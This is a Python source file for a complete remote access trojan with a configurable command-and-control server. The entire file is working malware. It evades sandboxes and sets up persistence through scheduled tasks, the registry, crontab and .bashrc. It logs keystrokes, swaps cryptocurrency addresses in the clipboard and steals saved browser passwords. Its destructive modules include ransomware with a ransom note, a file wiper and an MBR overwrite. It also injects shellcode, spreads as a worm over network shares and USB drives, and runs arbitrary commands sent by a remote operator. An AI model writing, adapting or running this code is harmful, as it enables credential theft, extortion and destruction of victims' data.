#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import json
import base64
import time
import threading
import platform
import hashlib
import ctypes
import shutil
import sqlite3
import winreg
import random
import string
import struct
import tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet
import mss
import psutil

# ---------- CONFIG (CHANGE THESE) ----------
C2_HOST = "192.168.1.100"      # Your C2 IP
C2_PORT = 4444
AES_KEY = hashlib.sha256(b"CHANGE_THIS_KEY_2026").digest()
WALLET_ADDR = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # placeholder
RANSOM_EXT = ".crypted"
PERSIST_NAME = "WindowsUpdateSvc"
WORM_SHARES = ["\\\\192.168.1.1\\share", "\\\\192.168.1.2\\share"]
USB_DRIVES = ["D:\\", "E:\\", "F:\\"]  # synthetic

# ---------- CRYPTO HELPERS ----------
def encrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def decrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

# ---------- ANTI-SANDBOX ----------
def is_sandbox():
    # VM artifacts
    if platform.system() == "Windows":
        if os.path.exists("C:\\Program Files\\VMware\\") or os.path.exists("C:\\Windows\\System32\\vboxguest.dll"):
            return True
    # Uptime < 30 min
    try:
        if time.time() - psutil.boot_time() < 1800:
            return True
    except:
        pass
    # Debugger check
    try:
        if sys.gettrace() is not None:
            return True
    except:
        pass
    return False

# ---------- PERSISTENCE ----------
def install_persistence():
    script = os.path.abspath(sys.argv[0])
    if platform.system() == "Windows":
        # Schtasks
        subprocess.run(f'schtasks /create /tn "{PERSIST_NAME}" /tr "{script}" /sc onlogon /rl highest /f', shell=True, capture_output=True)
        # Registry Run
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, PERSIST_NAME, 0, winreg.REG_SZ, script)
            winreg.CloseKey(reg)
        except:
            pass
        # Startup folder
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.exists(startup):
            shutil.copy(script, os.path.join(startup, PERSIST_NAME + ".exe"))
    else:
        # Linux crontab
        cron = f"@reboot python3 {script} > /dev/null 2>&1"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True)
        # .bashrc
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\npython3 {script} &\n")
    return "Persistence installed"

# ---------- KEYLOGGER ----------
keylog_data = []
keylog_running = False

def keylogger_worker():
    global keylog_running
    from pynput import keyboard
    def on_press(key):
        if not keylog_running:
            return False
        try:
            keylog_data.append(key.char if key.char else "")
        except:
            keylog_data.append(f"[{key}]")
        if len(keylog_data) > 5000:
            with open("keylog.txt", "a") as f:
                f.write("".join(keylog_data))
            keylog_data.clear()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylog():
    global keylog_running
    if keylog_running:
        return "Already running"
    keylog_running = True
    threading.Thread(target=keylogger_worker, daemon=True).start()
    return "Keylogger started"

def stop_keylog():
    global keylog_running
    keylog_running = False
    return "Stopped"

def get_keylog():
    with open("keylog.txt", "a") as f:
        f.write("".join(keylog_data))
        keylog_data.clear()
    try:
        with open("keylog.txt", "r") as f:
            return f.read()
    except:
        return ""

# ---------- CLIPBOARD HIJACK ----------
def get_clipboard():
    if platform.system() != "Windows":
        return None
    try:
        ctypes.windll.user32.OpenClipboard(0)
        if ctypes.windll.user32.IsClipboardFormatAvailable(1):
            data = ctypes.windll.user32.GetClipboardData(1)
            text = ctypes.c_wchar_p(data).value
            ctypes.windll.user32.CloseClipboard()
            return text
        ctypes.windll.user32.CloseClipboard()
    except:
        pass
    return None

def set_clipboard(text):
    if platform.system() != "Windows":
        return
    try:
        ctypes.windll.user32.OpenClipboard(0)
        ctypes.windll.user32.EmptyClipboard()
        hMem = ctypes.windll.kernel32.GlobalAlloc(0x2000, len(text)*2+2)
        ptr = ctypes.windll.kernel32.GlobalLock(hMem)
        ctypes.cdll.msvcrt.wcscpy(ptr, text)
        ctypes.windll.kernel32.GlobalUnlock(hMem)
        ctypes.windll.user32.SetClipboardData(1, hMem)
        ctypes.windll.user32.CloseClipboard()
    except:
        pass

def monitor_clipboard():
    last = ""
    while True:
        try:
            curr = get_clipboard()
            if curr and curr != last and len(curr) > 20:
                # Check for crypto addresses
                if any(curr.startswith(p) for p in ["bc1","1","3","0x","T"]):
                    with open("stolen_wallets.txt", "a") as f:
                        f.write(f"{time.ctime()}: {curr}\n")
                    set_clipboard(WALLET_ADDR)
                    last = WALLET_ADDR
                else:
                    last = curr
            time.sleep(1.5)
        except:
            time.sleep(1.5)

# ---------- CREDENTIAL STEALER ----------
def steal_credentials():
    creds = []
    # Chrome
    chrome_paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        os.path.expanduser("~") + "/.config/google-chrome/Default/Login Data"
    ]
    for path in chrome_paths:
        if os.path.exists(path):
            temp = os.path.join(tempfile.gettempdir(), "chromelogin.db")
            shutil.copyfile(path, temp)
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cur.fetchall():
                try:
                    if platform.system() == "Windows":
                        import win32crypt
                        dec = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                    else:
                        dec = row[2].decode() if isinstance(row[2], bytes) else row[2]
                    creds.append({"url": row[0], "user": row[1], "pass": dec})
                except:
                    pass
            conn.close()
            os.remove(temp)
    # Edge (same as Chrome)
    edge_paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    ]
    for path in edge_paths:
        if os.path.exists(path):
            temp = os.path.join(tempfile.gettempdir(), "edgelogin.db")
            shutil.copyfile(path, temp)
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cur.fetchall():
                try:
                    import win32crypt
                    dec = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                    creds.append({"url": row[0], "user": row[1], "pass": dec})
                except:
                    pass
            conn.close()
            os.remove(temp)
    return creds

# ---------- RANSOMWARE ----------
def ransomware_encrypt(dirs=None):
    if dirs is None:
        if platform.system() == "Windows":
            dirs = [
                os.path.expanduser("~") + "\\Documents",
                os.path.expanduser("~") + "\\Desktop",
                os.path.expanduser("~") + "\\Pictures",
                os.path.expanduser("~") + "\\Downloads",
                "C:\\Users\\Public\\Documents",
                "C:\\Backup"
            ]
        else:
            dirs = [
                os.path.expanduser("~") + "/Documents",
                os.path.expanduser("~") + "/Desktop",
                os.path.expanduser("~") + "/Pictures",
                "/tmp",
                "/var/backups"
            ]
    key = Fernet.generate_key()
    cipher = Fernet(key)
    count = 0
    for root in dirs:
        if not os.path.exists(root):
            continue
        for dirpath, _, files in os.walk(root):
            for fname in files:
                if fname.endswith(RANSOM_EXT):
                    continue
                full = os.path.join(dirpath, fname)
                try:
                    with open(full, "rb") as f:
                        data = f.read()
                    enc = cipher.encrypt(data)
                    with open(full + RANSOM_EXT, "wb") as f:
                        f.write(enc)
                    os.remove(full)
                    count += 1
                except:
                    pass
    note = f"All your files have been encrypted. Send 1 BTC to {WALLET_ADDR} within 72 hours.\nDecryption key: {base64.b64encode(key).decode()}\nContact: {WALLET_ADDR}@protonmail.com"
    with open("READ_ME_RECOVER.txt", "w") as f:
        f.write(note)
    return f"Encrypted {count} files. Key: {base64.b64encode(key).decode()}"

# ---------- FILE WIPER ----------
def wipe_files(dirs=None):
    if dirs is None:
        dirs = [os.path.expanduser("~"), "/tmp", "C:\\Users\\Public"]
    count = 0
    for root in dirs:
        if not os.path.exists(root):
            continue
        for dirpath, _, files in os.walk(root):
            for fname in files:
                full = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(full)
                    with open(full, "wb") as f:
                        f.write(b"\x00" * size)
                    os.remove(full)
                    count += 1
                except:
                    pass
    return f"Wiped {count} files"

# ---------- MBR OVERWRITE (synthetic) ----------
def overwrite_mbr():
    if platform.system() != "Windows":
        return "MBR overwrite only on Windows"
    try:
        # Open physical drive
        with open("\\\\.\\PhysicalDrive0", "rb+") as f:
            # Write junk to first sector
            f.write(b"MBR_DESTROYED_BY_RAT" + b"\x00" * 512)
        return "MBR overwritten (synthetic)"
    except Exception as e:
        return f"MBR error: {e}"

# ---------- PROCESS INJECTION (shellcode) ----------
def inject_shellcode():
    # Find explorer.exe PID
    explorer_pid = None
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() in ["explorer.exe", "winlogon.exe"]:
            explorer_pid = proc.info['pid']
            break
    if not explorer_pid:
        return "No suitable process found"
    # Shellcode: MessageBox "Injected" (x64) – replace with actual payload
    shellcode = bytes([
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        # ... more shellcode here (placeholder)
    ])
    try:
        # VirtualAllocEx, WriteProcessMemory, CreateRemoteThread via ctypes
        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        pid = explorer_pid
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not hProcess:
            return "OpenProcess failed"
        addr = kernel32.VirtualAllocEx(hProcess, None, len(shellcode), 0x1000, 0x40)
        if not addr:
            return "VirtualAllocEx failed"
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(hProcess, addr, shellcode, len(shellcode), ctypes.byref(written))
        thread = kernel32.CreateRemoteThread(hProcess, None, 0, addr, None, 0, None)
        if thread:
            kernel32.CloseHandle(thread)
        kernel32.CloseHandle(hProcess)
        return f"Injected into PID {pid}"
    except Exception as e:
        return f"Injection error: {e}"

# ---------- WORM PROPAGATION ----------
def worm_propagate():
    myself = sys.argv[0]
    if not os.path.exists(myself):
        myself = __file__
    count = 0
    for share in WORM_SHARES:
        try:
            dest = os.path.join(share, "sysupdate.exe")
            shutil.copyfile(myself, dest)
            count += 1
        except:
            pass
    for drive in USB_DRIVES:
        if os.path.exists(drive):
            try:
                dest = os.path.join(drive, "SystemVolumeInfo.exe")
                shutil.copyfile(myself, dest)
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[AutoRun]\nopen=SystemVolumeInfo.exe\n")
                count += 1
            except:
                pass
    return f"Worm copied to {count} targets"

# ---------- COMMAND DISPATCHER ----------
def handle_command(cmd):
    parts = cmd.split(" ", 1)
    action = parts[0]
    arg = parts[1] if len(parts) > 1 else ""

    if action == "sysinfo":
        return {
            "os": platform.system() + " " + platform.release(),
            "hostname": platform.node(),
            "user": os.getlogin(),
            "cpu": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB"
        }
    elif action == "ls":
        try:
            return subprocess.check_output("ls -la" if platform.system() != "Windows" else "dir", shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
        except Exception as e:
            return str(e)
    elif action == "cd":
        try:
            os.chdir(arg)
            return "Changed to " + os.getcwd()
        except Exception as e:
            return str(e)
    elif action == "screenshot":
        try:
            with mss.mss() as sct:
                img = sct.shot(output="scr.png")
                with open(img, "rb") as f:
                    return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"Error: {e}"
    elif action == "download":
        try:
            with open(arg, "rb") as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"Error: {e}"
    elif action == "upload":
        parts = arg.split(" ", 1)
        if len(parts) < 2:
            return "Usage: upload remote_path b64data"
        remote, b64 = parts[0], parts[1]
        try:
            with open(remote, "wb") as f:
                f.write(base64.b64decode(b64))
            return "Upload success"
        except Exception as e:
            return f"Error: {e}"
    elif action == "exec":
        try:
            exec(arg)
            return "Executed"
        except Exception as e:
            return str(e)
    elif action == "inject":
        return inject_shellcode()
    elif action == "ransom":
        return ransomware_encrypt()
    elif action == "wipe":
        return wipe_files()
    elif action == "mbr":
        return overwrite_mbr()
    elif action == "worm":
        return worm_propagate()
    elif action == "persist":
        return install_persistence()
    elif action == "keylog_start":
        return start_keylog()
    elif action == "keylog_stop":
        return stop_keylog()
    elif action == "keylog_get":
        return get_keylog()
    elif action == "clipboard":
        return get_clipboard()
    elif action == "credentials":
        return json.dumps(steal_credentials())
    elif action == "exit":
        os._exit(0)
    else:
        # Run as shell command
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors='ignore')
        except Exception as e:
            return str(e)

# ---------- MAIN LOOP ----------
def main():
    # Anti-sandbox
    if is_sandbox():
        time.sleep(600)
        sys.exit(0)
    # Persistence flag
    if not os.path.exists("persist_flag"):
        install_persistence()
        with open("persist_flag", "w") as f:
            f.write("done")
    # Start clipboard monitor
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    # Connection loop
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            while True:
                data = s.recv(8192).decode()
                if not data:
                    break
                msg = json.loads(decrypt(data))
                cmd = msg.get("cmd", "")
                if not cmd:
                    continue
                result = handle_command(cmd)
                s.send(encrypt(json.dumps({"type": "result", "cmd": cmd, "result": result})).encode())
            s.close()
        except Exception as e:
            time.sleep(30)
            continue

if __name__ == "__main__":
    main()